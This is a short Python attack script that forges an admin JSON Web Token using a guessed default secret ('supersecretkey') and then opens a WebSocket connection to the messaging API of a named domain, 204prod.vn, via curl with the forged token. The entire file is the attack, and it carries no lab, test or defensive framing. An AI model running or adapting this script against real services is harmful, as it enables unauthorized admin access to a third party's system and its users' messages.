import jwt
from datetime import datetime, timedelta, timezone

secret = "supersecretkey" # Try default
payload = {
    "sub": "1",
    "role": "admin",
    "exp": datetime.now(timezone.utc) + timedelta(minutes=60)
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Token: {token}")

import subprocess
cmd = f"curl -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Host: 204prod.vn' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' 'https://204prod.vn/api/v1/messaging/ws?token={token}'"
print(subprocess.getoutput(cmd))
